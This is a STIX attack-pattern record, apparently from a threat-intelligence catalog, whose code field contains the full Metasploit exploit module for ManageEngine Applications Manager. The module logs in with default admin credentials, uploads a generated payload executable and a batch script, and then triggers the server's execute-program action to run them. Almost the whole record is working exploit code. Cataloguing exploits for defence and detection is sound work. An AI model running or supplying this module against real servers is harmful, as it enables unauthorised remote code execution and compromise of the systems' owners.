{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--bfa131b8-684e-4c62-a4d9-8e0f4de97696",
    "created": "2024-08-14T16:53:20.30576Z",
    "modified": "2024-08-14T16:53:20.305764Z",
    "name": "ManageEngine Applications Manager Authenticated Code Execution",
    "description": " This module logs into the Manage Engine Applications Manager to upload a payload to the file system and a batch script that executes the payload. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/manageengine_apps_mngr.rb",
            "external_id": "manageengine_apps_mngr.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n\n  def initialize\n    super(\n      'Name'           => 'ManageEngine Applications Manager Authenticated Code Execution',\n      'Description'    => %q{\n            This module logs into the Manage Engine Applications Manager to upload a\n          payload to the file system and a batch script that executes the payload. },\n      'Author'         => 'Jacob Giannantonio <JGiannan[at]gmail.com>',\n      'Platform'       => 'win',\n      'DisclosureDate' => 'Apr 08 2011',\n      'References'     =>\n        [\n          [ 'EDB', '17152' ],\n        ],\n      'Targets'        =>\n        [\n          ['Automatic',{}],\n        ],\n      'DefaultTarget'  => 0\n      )\n\n    register_options(\n      [ Opt::RPORT(9090),\n        OptString.new('URI', [false, \"URI for Applications Manager\", '/']),\n        OptString.new('USER', [true, \"username\", 'admin']),\n        OptString.new('PASS', [true, \"password\", 'admin']),\n    ])\n  end\n  def target_url\n    uri = normalize_uri(datastore['URI'])\n    \"http://#{rhost}:#{rport}#{uri}\"\n  end\n  def exploit\n    # Make initial request to get assigned a session token\n    cookie = \"pagerefresh=1; NfaupdateMsg=true; sortBy=sByName; testcookie=; \"\n    cookie << \"am_username=;am_check=\"\n    begin\n      print_status \"#{target_url} Applications Manager - Requesting Session Token\"\n      res = send_request_cgi({\n        'method'=> 'GET',\n        'uri'\t=> \"#{target_url}/webclient/common/jsp/home.jsp\",\n        'cookie'  => cookie.to_s\n      }, 20)\n\n      if !res\n        print_error(\"Request to #{target_host} failed\")\n        return\n      end\n\n      if (res and res.code == 200 and res.to_s =~ /(JSESSIONID=[A-Z0-9]{32});/)\n        cookie << \"; #{$1}\"\n        print_good(\"Assigned #{$1}\")\n      else\n        print_error(\"Initial request failed: http error #{res.code}\")\n        return\n      end\n\n    rescue ::Rex::ConnectionRefused,::Rex::HostUnreachable,::Rex::ConnectionTimeout\n      return\n    rescue ::Timeout::Error, ::Errno::EPIPE\n      return\n    end\n\n    # send cookie to index.do\n    begin\n      print_status \"Sending session token to #{target_url}/index.do\"\n      res = send_request_raw({\n        'method'  => 'GET',\n        'uri'     => \"#{target_url}/index.do\",\n        'cookie' => cookie\n      }, 20)\n\n      if !res || res.code != 200\n        print_error(\"Request to #{target_url} failed\")\n      end\n\n    rescue ::Rex::ConnectionRefused,::Rex::HostUnreachable,::Rex::ConnectionTimeout\n      print_error(\"Request to #{target_url}/index.do failed\")\n      return\n    rescue ::Timeout::Error, ::Errno::EPIPE\n      return\n    end\n\n    # Log in with the assigned session token\n    post_data = \"clienttype2=html&j_username=\"\n    post_data << \"#{Rex::Text.uri_encode(datastore['USER'].to_s)}&\"\n    post_data << \"j_password=\"\n    post_data << \"#{Rex::Text.uri_encode(datastore['PASS'].to_s)}&button=Login\"\n    print_status(\"Trying to log in with '#{datastore['USER']}':'#{datastore['PASS']}'\")\n\n    begin\n      res = send_request_cgi({\n        'method'  => 'POST',\n        'uri'     => \"#{target_url}/j_security_check\",\n        'cookie' => cookie,\n        'data'    => post_data.to_s\n      }, 20)\n\n      if !res\n        print_error(\"Request to #{target_url} Failed\")\n      end\n      # Server responds with a 302 redirect when the login is successful and\n      # HTTP 200 for a failed login\n      if res and res.code == 302\n        print_good(\"Success:'#{datastore['USER']}':'#{datastore['PASS']}'\")\n      else\n        print_error(\"Failed to log into #{target_url}\")\n        return\n      end\n\n    rescue ::Rex::ConnectionRefused,::Rex::HostUnreachable,::Rex::ConnectionTimeout\n      print_error(\"Request to #{target_url}/j_security_check failed\")\n      return\n    rescue ::Timeout::Error, ::Errno::EPIPE\n      return\n    end\n    # initial request to upload.do\n    # I think this is required to upload content later on.\n    begin\n      res = send_request_cgi({\n        'method'  => 'POST',\n        'uri'     => \"#{target_url}/Upload.do\",\n        'cookie'=> cookie,\n        'data'    => post_data\n      }, 20)\n\n      if !res\n        print_error(\"HTTP request to #{target_url} Failed\")\n      end\n\n    rescue ::Rex::ConnectionRefused,::Rex::HostUnreachable,::Rex::ConnectionTimeout\n      print_error(\"Request to #{target_url}/Upload.do Failed\")\n      return\n    rescue ::Timeout::Error, ::Errno::EPIPE\n      return\n    end\n\n    # Transfer the payload executable via POST request to Upload.do\n    boundary = rand_text_numeric(11)\n    payload_file = \"#{rand_text_alphanumeric(20)}.exe\"\n    lines = \"-----------------------------#{boundary}\"\n    content_disposition = \"Content-Disposition: form-data; name=\\\"theFile\\\";\"\n    content_disposition << \"filename=\\\"#{payload_file}\\\"\\r\\n\"\n    post_data = lines + \"\\r\\n\" + content_disposition.to_s\n    post_data << \"Content-Type: application/x-msdos-program\\r\\n\\r\\n\"\n    post_data << \"#{generate_payload_exe}\\r\\n\\r\\n\"\n    post_data << lines + \"\\r\\nContent-Disposition: form-data; \"\n    post_data << \"name=\\\"uploadDir\\\"\\r\\n\\r\\n\"\n    post_data << \".\\/\\r\\n#{lines}--\\r\\n\"\n\n    begin\n      referer = \"http://#{target_url}/Upload.do\"\n      res = send_request_raw({\n        'method'  => 'POST',\n        'uri'     => \"#{target_url}/Upload.do\",\n        'headers' => {  'Referer' => referer,\n          'cookie' => \"#{cookie}\\r\\nContent-Type: \" +\n          \"multipart/form-data; \" +\n          \"boundary=---------------------------#{boundary}\",\n          'Content-Length' => post_data.length},\n          'data'    => post_data\n      }, 20)\n\n      if !res\n        print_error(\"Request to #{target_url} failed\")\n      end\n\n      if res and res.code == 200\n        print_good(\"Uploaded payload #{payload_file}\")\n      else\n        print_error(\"Response HTTP #{res.code} and HTTP 302 expected\")\n      end\n\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n      print_error(\"Request to #{target_url}/Upload.do failed\")\n      return\n    rescue ::Timeout::Error, ::Errno::EPIPE\n      return\n    end\n    # Transfer the batch sript via POST request to Upload.do\n    # The server will eventually call the batch script, which will call the payload.exe\n    boundary = rand_text_numeric(11)\n    bat_file = \"#{rand_text_alphanumeric(20)}.bat\"\n    lines = \"-----------------------------#{boundary}\"\n    content_disposition = \"Content-Disposition: form-data; name=\\\"theFile\\\"; \"\n    content_disposition << \"filename=\\\"#{bat_file}\\\"\\r\\n\"\n    post_data = lines + \"\\r\\n\" + content_disposition.to_s\n    post_data << \"Content-Type: application/x-msdos-program\\r\\n\\r\\n\"\n    post_data << \"@ECHO off && \\\"C:\\\\\\\\program files\\\\ManageEngine\\\\AppManager9\\\\workin\"\n    post_data << \"g\\\\#{payload_file}\\\"\\r\\n\\r\\n\"\n    post_data << lines + \"\\r\\nContent-Disposition: form-data; name=\\\"uploadDir\\\"\"\n    post_data << \"\\r\\n\\r\\n\"\n    post_data << \".\\/\\r\\n#{lines}--\\r\\n\"\n\n    begin\n      referer = \"#{target_url}/Upload.do\"\n        res = send_request_cgi({\n        'method'  => 'POST',\n        'uri'     => \"#{target_url}/Upload.do\",\n        'headers' => {  'Referer' => referer,\n        'cookie' => \"#{cookie}\\r\\nContent-Type: multipart/form-data; \" +\n        \"boundary=---------------------------#{boundary}\",\n        'Content-Length' => post_data.length},\n        'data'    => post_data\n      }, 20)\n\n      if !res\n        print_error(\"HTTP request to #{target_url} failed\")\n        return\n      end\n\n      if res and res.code == 200\n        print_good(\"Uploaded #{bat_file} to execute #{payload_file}\")\n      end\n\n    rescue ::Rex::ConnectionRefused,::Rex::HostUnreachable,::Rex::ConnectionTimeout\n      print_error(\"Request to #{target_url}/Upload.do failed\")\n      return\n    rescue ::Timeout::Error, ::Errno::EPIPE\n      return\n    end\n\n    action_name = \"#{rand_text_alphanumeric(20)}\"\n    post_data = \"actions=%2FshowTile.do%3FTileName%3D.ExecProg%26haid%3Dnull&ha\"\n    post_data << \"id=null&method=createExecProgAction&redirectTo=null&id=0&disp\"\n    post_data << \"layname=#{action_name}&serversite=local&choosehost=-2&host=&m\"\n    post_data << \"onitoringmode=TELNET&username=&password=&description=&port=23\"\n    post_data << \"&prompt=%24&command=#{bat_file}&execProgExecDir=\"\n    post_data << \"C%3A%5CProgram+Files%5CManageEngine%5CAppManager9%5Cworking&a\"\n    post_data << \"bortafter=10&cancel=false\"\n\n    # This client request is necessary because it sends a request to the server\n    # specifying that we are interested in executing the batch script.  If\n    # successful, the server response body will contain an actionID that is\n    # used to tell the server to execute the script.\n    begin\n      referer = \"#{target_url}/showTile.do?TileName=.ExecProg&haid=null\"\n      res = send_request_cgi({\n        'method'  => 'POST',\n        'uri'     => \"#{target_url}/adminAction.do\",\n        'headers' => {  'Referer' => referer,\n        'cookie' => cookie,\n        'Content-Type' => \"application/x-www-form-urlencoded\",\n        'Content-Length' => post_data.to_s.length},\n        'data'    => post_data.to_s\n      }, 20)\n\n      if !res\n        print_error(\"Request to #{target_host} failed\")\n      end\n\n      # We are parsing the response in order to determine the correct actionID.\n      # My solution for doing this is to iterate through the HTTP response one\n      # line at a time.  The correct actionID always comes up several lines\n      # after reading the name of the batch file 3 times.  Even if other batch\n      # files are mixed up in the list of actions to execute, ours is always\n      # the next one after reading the batch file name 3 times\n\n      if res and (res.code == 302 || res.code == 200)\n        action_id = 0\n        x = 0\n        res.body.each_line do |k|\n          k.strip!\n          if((k =~ /&actionID=(\\d{8})/) && (x == 3))\n            action_id = $1\n            break;\n          elsif((k =~ /#{bat_file}/) && (x < 3))\n            x+=1\n          end\n        end\n      else\n        print_error(\"HTTP error #{res.code} and HTTP 302 expected\")\n      end\n\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n      print_error(\"HTTP request to #{target_url}/adminAction.do \")\n      return\n    rescue ::Timeout::Error, ::Errno::EPIPE\n      return\n    end\n\n    begin\n      referer = \"#{target_url}/common/executeScript.do?\"\n      referer << \"method=testAction&actionID=#{action_id}&haid=null\"\n      print_good(\"Requesting to execute batch file with actionID #{action_id}\")\n      res = send_request_cgi({\n        'method'  => 'GET',\n        'uri'     => \"#{target_url}/common/executeScript.do?method=testAction&\" +\n            \"actionID=#{action_id}&haid=null\",\n        'headers' => {  'Referer' => referer,\n        'cookie' => \t\"executeProgramActionTable_sortcol=1; \" +\n            \"executeProgramActionTable_sortdir=down; \" +\n            \"#{cookie}; executeProgramActionTable_\" +\n            \"sortdir=down; executeProgramActionTable_sortcol=1\",\n        'Content-Type' => \"application/x-www-form-urlencoded\"}\n      }, 20)\n\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n      print_error(\"Request to execute the actionID failed\")\n    rescue ::Timeout::Error, ::Errno::EPIPE\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "Apr 08 2011",
    "x_mitre_platforms": [
        "win'"
    ]
}